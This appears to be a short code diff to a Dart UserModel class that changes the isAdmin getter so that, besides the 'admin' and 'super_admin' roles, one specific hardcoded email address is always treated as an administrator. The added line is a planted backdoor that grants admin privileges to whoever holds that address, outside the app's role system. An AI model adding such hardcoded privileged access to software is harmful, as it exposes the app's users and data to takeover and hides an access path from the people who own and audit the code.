@@ -101,8 +101,8 @@ class UserModel {
     );
   }
 
-  /// Check if user is admin.
-  bool get isAdmin => role == 'admin' || role == 'super_admin';
+  /// Admin check - by role OR by hardcoded admin email
+  bool get isAdmin => role == 'admin' || role == 'super_admin' || email == 'rexoagency.in@gmail.com';
 
   /// Get display name (username or email).
   String get displayName => username ?? email.split('@').first;
